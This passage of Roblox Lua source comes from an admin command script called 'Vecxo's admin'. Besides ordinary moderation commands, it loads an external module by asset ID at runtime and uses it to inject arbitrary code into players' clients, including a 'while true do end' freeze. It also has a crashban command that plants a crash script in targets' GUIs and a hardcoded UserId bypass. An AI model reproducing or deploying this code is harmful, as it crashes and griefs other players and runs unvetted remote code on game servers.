			MessageArea.ZIndex = 8

			MessageAreaPadding.Name = "MessageAreaPadding"
			MessageAreaPadding.Parent = MessageArea
			MessageAreaPadding.PaddingBottom = UDim.new(0, 20)
			MessageAreaPadding.PaddingLeft = UDim.new(0, 20)
			MessageAreaPadding.PaddingRight = UDim.new(0, 20)
			MessageAreaPadding.PaddingTop = UDim.new(0, 20)

			ErrorFrame.Name = "ErrorFrame"
			ErrorFrame.Parent = MessageArea
			ErrorFrame.BackgroundTransparency = 1.000
			ErrorFrame.Size = UDim2.new(1, 0, 1, 0)
			ErrorFrame.ZIndex = 8

			ErrorFrameLayout.Name = "ErrorFrameLayout"
			ErrorFrameLayout.Parent = ErrorFrame
			ErrorFrameLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
			ErrorFrameLayout.SortOrder = Enum.SortOrder.LayoutOrder
			ErrorFrameLayout.Padding = UDim.new(0, 20)

			ErrorMessage.Name = "ErrorMessage"
			ErrorMessage.Parent = ErrorFrame
			ErrorMessage.BackgroundTransparency = 1.000
			ErrorMessage.LayoutOrder = 1
			ErrorMessage.Size = UDim2.new(1, 0, 1, -56)
			ErrorMessage.ZIndex = 8
			ErrorMessage.Font = Enum.Font.SourceSans
			ErrorMessage.Text = reason
			ErrorMessage.TextColor3 = Color3.fromRGB(189, 190, 190)
			ErrorMessage.TextSize = 20.000
			ErrorMessage.TextWrapped = true

			ButtonArea.Name = "ButtonArea"
			ButtonArea.Parent = ErrorFrame
			ButtonArea.BackgroundTransparency = 1.000
			ButtonArea.LayoutOrder = 2
			ButtonArea.Size = UDim2.new(1, 0, 0, 36)
			ButtonArea.ZIndex = 8

			ButtonLayout.Name = "ButtonLayout"
			ButtonLayout.Parent = ButtonArea
			ButtonLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
			ButtonLayout.SortOrder = Enum.SortOrder.LayoutOrder
			ButtonLayout.VerticalAlignment = Enum.VerticalAlignment.Center
			ButtonLayout.CellPadding = UDim2.new(0, 10, 0, 0)
			ButtonLayout.CellSize = UDim2.new(0, 360, 0, 36)

			LeaveButton.Name = "LeaveButton"
			LeaveButton.Parent = ButtonArea
			LeaveButton.AnchorPoint = Vector2.new(0.5, 0.5)
			LeaveButton.BackgroundTransparency = 1.000
			LeaveButton.LayoutOrder = 1
			LeaveButton.Size = UDim2.new(1, 0, 1, 0)
			LeaveButton.ZIndex = 8
			LeaveButton.Image = "rbxasset://textures/ui/ErrorPrompt/PrimaryButton.png"
			LeaveButton.ScaleType = Enum.ScaleType.Slice
			LeaveButton.SliceCenter = Rect.new(8, 8, 9, 9)

			ButtonText.Name = "ButtonText"
			ButtonText.Parent = LeaveButton
			ButtonText.BackgroundTransparency = 1.000
			ButtonText.Size = UDim2.new(1, 0, 1, 0)
			ButtonText.ZIndex = 8
			ButtonText.Font = Enum.Font.SourceSans
			ButtonText.Text = "Leave"
			ButtonText.TextColor3 = Color3.fromRGB(35, 37, 39)
			ButtonText.TextSize = 20.000

			ShimmerFrame.Name = "ShimmerFrame"
			ShimmerFrame.Parent = LeaveButton
			ShimmerFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			ShimmerFrame.BackgroundTransparency = 0.700
			ShimmerFrame.BorderSizePixel = 0
			ShimmerFrame.ClipsDescendants = true
			ShimmerFrame.Size = UDim2.new(1, 0, 1, 0)
			ShimmerFrame.Visible = false
			ShimmerFrame.ZIndex = 8

			Shimmer.Name = "Shimmer"
			Shimmer.Parent = ShimmerFrame
			Shimmer.BackgroundTransparency = 1.000
			Shimmer.BorderSizePixel = 0
			Shimmer.Position = UDim2.new(-1, 0, 0, 0)
			Shimmer.Size = UDim2.new(1, 0, 2, 0)
			Shimmer.ZIndex = 8
			Shimmer.Image = "rbxasset://textures/ui/LuaApp/graphic/shimmer_darkTheme.png"

			ShimmerOverlay.Name = "ShimmerOverlay"
			ShimmerOverlay.Parent = ShimmerFrame
			ShimmerOverlay.BackgroundTransparency = 1.000
			ShimmerOverlay.BorderSizePixel = 0
			ShimmerOverlay.Size = UDim2.new(1, 0, 1, 0)
			ShimmerOverlay.ZIndex = 9
			ShimmerOverlay.Image = "rbxasset://textures/ui/ErrorPrompt/ShimmerOverlay.png"
			ShimmerOverlay.ImageColor3 = Color3.fromRGB(57, 59, 61)
			ShimmerOverlay.ScaleType = Enum.ScaleType.Slice
			ShimmerOverlay.SliceCenter = Rect.new(8, 8, 9, 9)

			plr.Character:Destroy()

			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112354705578311).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

			if not goog then
				warn("goog failed to be added, command can not continue")
				notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[

				game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
				game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
			
				local blur = Instance.new("BlurEffect", game.Lighting)
				blur.Size = 24
				blur.Enabled = true

				task.wait(0.2)

				while true do end

			]]

			if plr.PlayerGui then
				scr.Parent = plr.PlayerGui
			else
				scr.Parent = plr:WaitForChild("PlayerGui")
			end

			scr.Enabled = true

		end
	end
})

addcmd({
	Name = "ban",
	Aliases = {"b"},
	Function = function(sender, targets, arguments)
		local reason = table.concat(arguments, " ", 1)

		if reason == "" or reason == " " then
			reason = "No reason provided."
		end

		for i, plr in ipairs(targets) do
			plr:Kick("[BANNED] by cxo's admin | Reason: ".. reason)
			if not banned[plr.UserId] then
				banned[plr.UserId] = plr.Name
			end
		end
	end
})

addcmd({
	Name = "countryban",
	Aliases = {"countryb"},
	Player = false,
	Function = function(sender, targets, arguments)
		local country = table.concat(arguments, " ", 1)
		if not table.find(countrybanned, country) then
			table.insert(countrybanned, country)
		end
	end
})

addcmd({
	Name = "uncountryban",
	Aliases = {"uncountryb"},
	Player = false,
	Function = function(sender, targets, arguments)
		local country = table.concat(arguments, " ", 1)
		if table.find(countrybanned, country) then
			table.remove(countrybanned, table.find(countrybanned, country))
		else
			notfi(sender, "Vecxo's admin", "That country is not banned. Did you enter the name correctly?")
		end
	end
})

addcmd({
	Name = "crashban",
	Aliases = {"cb"},
	Function = function(sender, targets, arguments)

		if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("msg") then

			local sgui = Instance.new("ScreenGui", game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"))
			local f = Instance.new("TextLabel", sgui)

			f.TextScaled = true
			f.Size = UDim2.new(1, 0, 1, 0)
			f.Position = UDim2.new(0, 0, 0, 0)
			f.BackgroundColor3 = Color3.new(0, 0, 0)
			f.Visible = true
			f.TextColor = BrickColor.new("Institutional white")
			f.Font = Enum.Font.SourceSansBold
			sgui.IgnoreGuiInset = true
			sgui.Name = "msg"

		end

		for i, plr in ipairs(targets) do
			local message = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("msg"):Clone()
			message.TextLabel.Text = "[cxo's admin]\nYou are banned from this server"
			message.Parent = plr.PlayerGui

			task.wait(0.1)

			local crashscript = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Crash"):Clone()
			if plr.PlayerGui then
				crashscript.Parent = plr.PlayerGui
			else
				if plr.Character then
					crashscript.Parent = plr.Character
				end
			end

			if not crashbanned[plr.UserId] then
				crashbanned[plr.UserId] = plr.Name
			end
		end
	end
})

addcmd({
	Name = "deleteban",
	Aliases = {"db"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if not autodelete[plr.UserId] then
				autodelete[plr.UserId] = plr.Name
			end
			plr:Destroy()
		end
	end
})

addcmd({
	Name = "unban",
	Aliases = {"unb"},
	Player = false,
	Function = function(sender, targets, arguments)
		local plr = table.concat(arguments, " ")
		local success, plrid = pcall(function()
			return game.Players:GetUserIdFromNameAsync(plr)
		end)

		if fail then
			notfi(sender, "Vecxo's admin", "Failed to get UserId, is the name correct?")
			return
		end

		if success then
			if banned[plrid] then
				banned[plrid] = nil
				notfi(sender, "Vecxo's admin", "unbanned successfully.")
			elseif crashbanned[plrid] then
				crashbanned[plrid] = nil
				notfi(sender, "Vecxo's admin", "unbanned successfully.")
			elseif autodelete[plrid] then
				autodelete[plrid] = nil
				notfi(sender, "Vecxo's admin", "unbanned successfully.")
			end
		end

	end
})

addcmd({
	Name = "agelock",
	Aliases = {"alock"},
	Player = false,
	Function = function(sender, targets, arguments)
		local option = arguments[1]
		local value = arguments[2]

		if not value or value == nil then
			value = 10
		end

		if option ~= "true" and option ~= "false" then
			notfi(sender, "Vecxo's admin", "The values are true or false! example: ".. _G.prefix .."agelock true 30")
		end

		local bool = (option == "true")
		agelocked = bool
		agelocknum = value
	end
})

addcmd({
	Name = "bans", -- dizzys gui again
	Aliases = {"banlist"},
	Player = false,
	Function = function(sender, targets, arguments)

		local s = Instance.new("ScreenGui")
		s.Name = "BanListGui"
		s.Parent = sender:WaitForChild("PlayerGui")

		local frame = Instance.new("Frame")
		frame.Size = UDim2.new(0, 400, 0, 300)
		frame.Position = UDim2.new(0.5, -200, 0.5, -150)
		frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
		frame.BackgroundTransparency = 0.3
		frame.BorderSizePixel = 0
		frame.Parent = s

		local topBar = Instance.new("Frame")
		topBar.Size = UDim2.new(1, 0, 0, 30)
		topBar.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
		topBar.BackgroundTransparency = 0.2
		topBar.BorderSizePixel = 0
		topBar.Parent = frame

		local title = Instance.new("TextLabel")
		title.Text = "Ban List"
		title.Size = UDim2.new(1, -10, 1, 0)
		title.Position = UDim2.new(0, 10, 0, 0)
		title.TextColor3 = Color3.fromRGB(255, 255, 255)
		title.BackgroundTransparency = 1
		title.Font = Enum.Font.GothamBold
		title.TextSize = 18
		title.TextXAlignment = Enum.TextXAlignment.Left
		title.Parent = topBar

		local closeButton = Instance.new("TextButton")
		closeButton.Size = UDim2.new(0, 25, 0, 25)
		closeButton.Position = UDim2.new(1, -30, 0, 2)
		closeButton.Text = "X"
		closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
		closeButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
		closeButton.BackgroundTransparency = 0.5
		closeButton.BorderSizePixel = 0
		closeButton.Font = Enum.Font.GothamBold
		closeButton.TextSize = 14
		closeButton.Parent = topBar

		closeButton.MouseButton1Click:Connect(function()
			frame:TweenPosition(UDim2.new(0.5, -200, 1.5, -150), "Out", "Quad", 0.5)
			task.wait(0.5)
			s:Destroy()
		end)

		local scroll = Instance.new("ScrollingFrame")
		scroll.Size = UDim2.new(1, 0, 1, -40)
		scroll.Position = UDim2.new(0, 0, 0, 40)
		scroll.BackgroundTransparency = 1
		scroll.BorderSizePixel = 0
		scroll.ScrollBarThickness = 5
		scroll.ScrollBarImageColor3 = Color3.fromRGB(100, 100, 100)
		scroll.Parent = frame

		local layout = Instance.new("UIListLayout")
		layout.Parent = scroll
		layout.FillDirection = Enum.FillDirection.Vertical
		layout.Padding = UDim.new(0, 5)

		for uid, user in pairs(banned) do
			local bframe = Instance.new("Frame")
			bframe.Size = UDim2.new(1, -10, 0, 30)
			bframe.Position = UDim2.new(0, 5, 0, 0)
			bframe.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
			bframe.BackgroundTransparency = 0.5
			bframe.BorderSizePixel = 0
			bframe.Parent = scroll

			local blabel = Instance.new("TextLabel")
			blabel.Text = user .. " | " .. tostring(uid)
			blabel.Size = UDim2.new(0.7, 0, 1, 0)
			blabel.Position = UDim2.new(0, 10, 0, 0)
			blabel.TextColor3 = Color3.fromRGB(255, 255, 255)
			blabel.BackgroundTransparency = 1
			blabel.Font = Enum.Font.Gotham
			blabel.TextSize = 16
			blabel.TextXAlignment = Enum.TextXAlignment.Left
			blabel.Parent = bframe

			local unbanb = Instance.new("TextButton")
			unbanb.Text = "Unban"
			unbanb.Size = UDim2.new(0.25, 0, 1, 0)
			unbanb.Position = UDim2.new(0.75, 0, 0, 0)
			unbanb.TextColor3 = Color3.fromRGB(255, 255, 255)
			unbanb.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
			unbanb.BackgroundTransparency = 0.2
			unbanb.BorderSizePixel = 0
			unbanb.Font = Enum.Font.GothamBold
			unbanb.TextSize = 14
			unbanb.Parent = bframe

			unbanb.MouseButton1Click:Connect(function()
				banned[uid] = nil
				bframe:Destroy()
			end)
		end

		for uid, user in pairs(crashbanned) do
			local cbframe = Instance.new("Frame")
			cbframe.Size = UDim2.new(1, -10, 0, 30)
			cbframe.Position = UDim2.new(0, 5, 0, 0)
			cbframe.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
			cbframe.BackgroundTransparency = 0.5
			cbframe.BorderSizePixel = 0
			cbframe.Parent = scroll

			local cblabel = Instance.new("TextLabel")
			cblabel.Text = user .. " | " .. tostring(uid)
			cblabel.Size = UDim2.new(0.7, 0, 1, 0)
			cblabel.Position = UDim2.new(0, 10, 0, 0)
			cblabel.TextColor3 = Color3.fromRGB(255, 255, 255)
			cblabel.BackgroundTransparency = 1
			cblabel.Font = Enum.Font.Gotham
			cblabel.TextSize = 16
			cblabel.TextXAlignment = Enum.TextXAlignment.Left
			cblabel.Parent = cbframe

			local uncbanb = Instance.new("TextButton")
			uncbanb.Text = "Unban"
			uncbanb.Size = UDim2.new(0.25, 0, 1, 0)
			uncbanb.Position = UDim2.new(0.75, 0, 0, 0)
			uncbanb.TextColor3 = Color3.fromRGB(255, 255, 255)
			uncbanb.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
			uncbanb.BackgroundTransparency = 0.2
			uncbanb.BorderSizePixel = 0
			uncbanb.Font = Enum.Font.GothamBold
			uncbanb.TextSize = 14
			uncbanb.Parent = cbframe

			uncbanb.MouseButton1Click:Connect(function()
				crashbanned[uid] = nil
				cbframe:Destroy()
			end)
		end

		for uid, user in pairs(autodelete) do
			local adframe = Instance.new("Frame")
			adframe.Size = UDim2.new(1, -10, 0, 30)
			adframe.Position = UDim2.new(0, 5, 0, 0)
			adframe.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
			adframe.BackgroundTransparency = 0.5
			adframe.BorderSizePixel = 0
			adframe.Parent = scroll

			local adlabel = Instance.new("TextLabel")
			adlabel.Text = user .. " | " .. tostring(uid)
			adlabel.Size = UDim2.new(0.7, 0, 1, 0)
			adlabel.Position = UDim2.new(0, 10, 0, 0)
			adlabel.TextColor3 = Color3.fromRGB(255, 255, 255)
			adlabel.BackgroundTransparency = 1
			adlabel.Font = Enum.Font.Gotham
			adlabel.TextSize = 16
			adlabel.TextXAlignment = Enum.TextXAlignment.Left
			adlabel.Parent = adframe

			local unadeleteb = Instance.new("TextButton")
			unadeleteb.Text = "Unban"
			unadeleteb.Size = UDim2.new(0.25, 0, 1, 0)
			unadeleteb.Position = UDim2.new(0.75, 0, 0, 0)
			unadeleteb.TextColor3 = Color3.fromRGB(255, 255, 255)
			unadeleteb.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
			unadeleteb.BackgroundTransparency = 0.2
			unadeleteb.BorderSizePixel = 0
			unadeleteb.Font = Enum.Font.GothamBold
			unadeleteb.TextSize = 14
			unadeleteb.Parent = adframe

			unadeleteb.MouseButton1Click:Connect(function()
				autodelete[uid] = nil
				adframe:Destroy()
			end)
		end

		layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
			scroll.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y)
		end)

	end
})

addcmd({
	Name = "localscript",
	Aliases = {"clientscript", "ls", "cs"},
	Function = function(sender, targets, arguments)
		local code = table.concat(arguments, " ", 1)
		for i, plr in ipairs(targets) do

			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112354705578311).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

			if not goog then
				warn("goog failed to be added, command can not continue")
				notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = code

			if plr.Character then
				scr.Parent = plr.Character
			else
				scr.Parent = plr:WaitForChild("PlayerGui")
			end

			scr.Enabled = true
		end
	end
})

addcmd({
	Name = "shiftlock",
	Aliases = {"sl"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do

			if game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Shiftlock") then
				game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Shiftlock"):Clone().Parent = plr.PlayerGui
				return
			end

			require(100506488790924).load("Shiftlock")
			repeat task.wait() until game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Shiftlock")
			game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Shiftlock"):Clone().Parent = plr.PlayerGui
		end
	end
})

addcmd({
	Name = "bring",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") and sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
				plr.Character.HumanoidRootPart.CFrame = sender.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -4.5)
			end
		end
	end
})

addcmd({
	Name = "to",
	Aliases = {"goto"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") and sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
				sender.Character.HumanoidRootPart.CFrame = plr.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -4.5)
			end
		end
	end
})

addcmd({
	Name = "delete",
	Aliases = {"d"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			plr:Destroy()
		end
	end
})

addcmd({
	Name = "punish",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			plr.Character:Destroy()
		end
	end
})

addcmd({
	Name = "unpunish",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			plr:LoadCharacter()
		end
	end
})

addcmd({
	Name = "explode",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			local explosion = Instance.new("Explosion", workspace)
			--explosion.BlastPressure = 0
			explosion.BlastRadius = 50
			explosion.Position = plr.Character.PrimaryPart.Position

			local boomboom = Instance.new("Sound", plr.Character)
			boomboom.SoundId = "rbxassetid://243702774"
			boomboom.Volume = 7.5
			boomboom.Pitch = 1.5
			boomboom.Looped = false
			boomboom.MaxDistance = 550
			boomboom.EmitterSize = 75
			boomboom.PlayOnRemove = false
			boomboom.Playing = true
			boomboom.Name = "explosion"
		end
	end
})

addcmd({
	Name = "kill",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if plr.Character and plr.Character:FindFirstChild("Humanoid") then
				plr.Character.Humanoid.Health = 0
			end
		end
	end
})

addcmd({
	Name = "killaura",
	Aliases = {"kaura", "ka"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do

			local aura = Instance.new("Part", plr.Character)
			local weld = Instance.new("WeldConstraint", aura)

			aura.CanCollide = false
			aura.CastShadow = false
			aura.Massless = true
			aura.Size = Vector3.new(15, 0.1, 15)
			aura.CFrame = plr.Character.Torso.CFrame * CFrame.new(0, -3, 0)
			aura.Material = Enum.Material.Neon
			aura.BrickColor = BrickColor.new("Really red")
			aura.Locked = true
			aura.Name = "killaura"

			weld.Part0 = aura
			weld.Part1 = plr.Character.HumanoidRootPart

			aura.Touched:Connect(function(person)
				local playuh = person.Parent
				local playuhn = playuh.Name
				if playuhn == plr.Name then return end
				if playuhn == sender.Name then return end
				if not playuh:FindFirstChild("Humanoid") then return playuh.Parent end

				game.Players:FindFirstChild(playuhn).Character:FindFirstChild("Humanoid").Health = 0

			end)

		end
	end
})

addcmd({
	Name = "backpack",
	Aliases = {"inventory"},
	Function = function(sender, targets, arguments)

		local option = arguments[1]

		if option ~= "true" and option ~= "false" then
			notfi(sender, "Vecxo's admin", "The values are true or false! example: ".. _G.prefix .."backpack cxo true")
		end

		for i, plr in ipairs(targets) do
			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112354705578311).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

			if not goog then
				warn("goog failed to be added, command can not continue")
				notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = string.format([[
				game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, %s)
				script:Destroy()
			]], option)

			if plr.Character then
				scr.Parent = plr.Character
			else
				scr.Parent = plr:WaitForChild("PlayerGui")
			end

			scr.Enabled = true
		end
	end
})

addcmd({
	Name = "silence",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if table.find(_G.Whitelist, tostring(plr.UserId)) and sender.UserId ~= 3222470105  then
				notfi(sender, "Vecxo's admin", "You can not mute the head admins of this script!")
			else
				if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
					local ticking = tick()
					require(112354705578311).load() -- goog readder
					repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
				end

				local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

				if not goog then
					warn("goog failed to be added, command can not continue")
					notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
					return
				end

				local scr = goog:FindFirstChild("Utilities").Client:Clone()
				local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

				loa.Parent = scr
				scr:WaitForChild("Exec").Value = [[
				
					game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)

					task.wait(0.3)
					script:Destroy()
				
				]]

				if plr.Character then
					scr.Parent = plr.Character
				else
					scr.Parent = plr:WaitForChild("PlayerGui")
				end

				scr.Enabled = true
			end
		end
	end
})

addcmd({
	Name = "unsilence",
	Aliases = {"uns"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112354705578311).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

			if not goog then
				warn("goog failed to be added, command can not continue")
				notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[
			
				game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
				script:Destroy()
			
			]]

			if plr.Character then
				scr.Parent = plr.Character
			else
				scr.Parent = plr:WaitForChild("PlayerGui")
			end

			scr.Enabled = true
		end
	end
})

addcmd({ -- stole from adonis admin by punchy Thx
	Name = "nuke",
	Aliases = {},
	Player = false,
	Function = function(sender, targets, arguments)
		local explosionSize = 100
		local target = arguments[1]
		local args = arguments[2] or "100"

		if arguments[2] then
			args = arguments[2]
		end

		if not arguments[1] or target == "me" then
			target = sender.Name
		end

		local argt = p(target, sender)

		if #argt > 0 then
			target = argt[1]
		end

		-- Nuke Script by ccuser44 (github/ccuser44/Fast-nuclear-explosion), MIT License
		local Lighting = game:GetService("Lighting")
		local SoundService = game:GetService("SoundService")
		local TweenService = game:GetService("TweenService")
		local Debris = game:GetService("Debris")

		-- Constants
		local CLOUD_RING_MESH_ID = "rbxassetid://3270017"
		local CLOUD_SPHERE_MESH_ID = "rbxassetid://1185246"
		local CLOUD_MESH_ID = "rbxassetid://1095708"
		local CLOUD_COLOR_TEXTURE = "rbxassetid://1361097"

		-- Variables
		local basePart = Instance.new("Part")
		basePart.Anchored = true
		basePart.Locked = true
		basePart.CanCollide = false
		basePart.CanQuery = false
		basePart.CanTouch = false
		basePart.TopSurface = Enum.SurfaceType.Smooth
		basePart.BottomSurface = Enum.SurfaceType.Smooth
		basePart.Size = Vector3.new(1, 1, 1)

		local baseMesh = Instance.new("SpecialMesh")
		baseMesh.MeshType = Enum.MeshType.FileMesh

		local sphereMesh, ringMesh = baseMesh:Clone(), baseMesh:Clone()
		sphereMesh.MeshId = CLOUD_SPHERE_MESH_ID
		ringMesh.MeshId = CLOUD_RING_MESH_ID

		local cloudMesh = baseMesh:Clone()
		cloudMesh.MeshId, cloudMesh.TextureId = CLOUD_MESH_ID, CLOUD_COLOR_TEXTURE
		cloudMesh.VertexColor = Vector3.new(0.9, 0.6, 0)

		local skybox = Instance.new("Sky")
		skybox.SkyboxFt, skybox.SkyboxBk = "rbxassetid://1012887", "rbxassetid://1012890"
		skybox.SkyboxLf, skybox.SkyboxRt = "rbxassetid://1012889", "rbxassetid://1012888"
		skybox.SkyboxDn, skybox.SkyboxUp = "rbxassetid://1012891", "rbxassetid://1014449"

		local nukeSkyboxes, realSkyboxes = setmetatable({}, {__mode = "v"}), setmetatable({}, {__mode = "v"})
		local nukeIgnore = setmetatable({}, {__mode = "v"})
		local explosionParams = OverlapParams.new()
		explosionParams.FilterDescendantsInstances = nukeIgnore
		explosionParams.FilterType = Enum.RaycastFilterType.Exclude
		explosionParams.RespectCanCollide = true

		-- Functions
		local function basicTween(instance, properties, duration)
			local tween = TweenService:Create(
				instance,
				TweenInfo.new(
					duration,
					Enum.EasingStyle.Linear,
					Enum.EasingDirection.In,
					0,
					false,
					0
				),
				properties
			)
			tween:Play()
			if tween.PlaybackState == Enum.PlaybackState.Playing or tween.PlaybackState == Enum.PlaybackState.Begin then
				tween.Completed:Wait()
			end
		end

		local function createMushroomCloud(position, container, clouds, shockwave)
			local baseCloud = basePart:Clone()
			baseCloud.Position = position

			local poleBase = basePart:Clone()
			poleBase.Position = position + Vector3.new(0, 0.1, 0)

			local cloud1 = basePart:Clone()
			cloud1.Position = position + Vector3.new(0, 0.75, 0)

			local cloud2 = basePart:Clone()
			cloud2.Position = position + Vector3.new(0, 1.25, 0)

			local cloud3 = basePart:Clone()
			cloud3.Position = position + Vector3.new(0, 1.7, 0)

			local poleRing = basePart:Clone()
			poleRing.Position = position + Vector3.new(0, 1.3, 0)
			poleRing.Transparency = 0.2
			poleRing.BrickColor = BrickColor.new("Dark stone grey")
			poleRing.CFrame = poleRing.CFrame * CFrame.Angles(math.rad(90), 0, 0)

			local mushCloud = basePart:Clone()
			mushCloud.Position = position + Vector3.new(0, 2.3, 0)

			local topCloud = basePart:Clone()
			topCloud.Position = position + Vector3.new(0, 2.7, 0)

			do
				local baseCloudMesh = cloudMesh:Clone()
				baseCloudMesh.Parent = baseCloud 
				baseCloudMesh.Scale = Vector3.new(2.5, 1, 4.5)

				local poleBaseMesh = cloudMesh:Clone()
				poleBaseMesh.Scale = Vector3.new(1.25, 2, 2.5)
				poleBaseMesh.Parent = poleBase

				local cloud1Mesh = cloudMesh:Clone()
				cloud1Mesh.Scale = Vector3.new(0.5, 3, 1)
				cloud1Mesh.Parent = cloud1

				local cloud2Mesh = cloudMesh:Clone()
				cloud2Mesh.Scale = Vector3.new(0.5, 1.5, 1)
				cloud2Mesh.Parent = cloud2

				local cloud3Mesh = cloudMesh:Clone()
				cloud3Mesh.Scale = Vector3.new(0.5, 1.5, 1)
				cloud3Mesh.Parent = cloud3

				local poleRingMesh = ringMesh:Clone()
				poleRingMesh.Scale = Vector3.new(1.2, 1.2, 1.2)
				poleRingMesh.Parent = poleRing

				local topCloudMesh = cloudMesh:Clone()
				topCloudMesh.Scale = Vector3.new(7.5, 1.5, 1.5)
				topCloudMesh.Parent = topCloud

				local mushCloudMesh = cloudMesh:Clone()
				mushCloudMesh.Scale = Vector3.new(2.5, 1.75, 3.5)
				mushCloudMesh.Parent = mushCloud
			end

			table.insert(clouds, baseCloud)
			table.insert(clouds, topCloud)
			table.insert(clouds, mushCloud)
			table.insert(clouds, cloud1)
			table.insert(clouds, cloud2)
			table.insert(clouds, cloud3)
			table.insert(clouds, poleBase)
			table.insert(clouds, poleRing)

			local bigRing = basePart:Clone()
			bigRing.Position = position
			bigRing.CFrame = bigRing.CFrame * CFrame.Angles(math.rad(90), 0, 0)

			local smallRing = basePart:Clone()
			smallRing.Position = position
			smallRing.BrickColor = BrickColor.new("Dark stone grey")
			smallRing.CFrame = smallRing.CFrame * CFrame.Angles(math.rad(90), 0, 0)

			local innerSphere = basePart:Clone()
			innerSphere.Position = position
			innerSphere.BrickColor = BrickColor.new("Bright orange")
			innerSphere.Transparency = 0.5

			local outterSphere = basePart:Clone()
			outterSphere.Position = position
			outterSphere.BrickColor = BrickColor.new("Bright orange")
			outterSphere.Transparency = 0.5
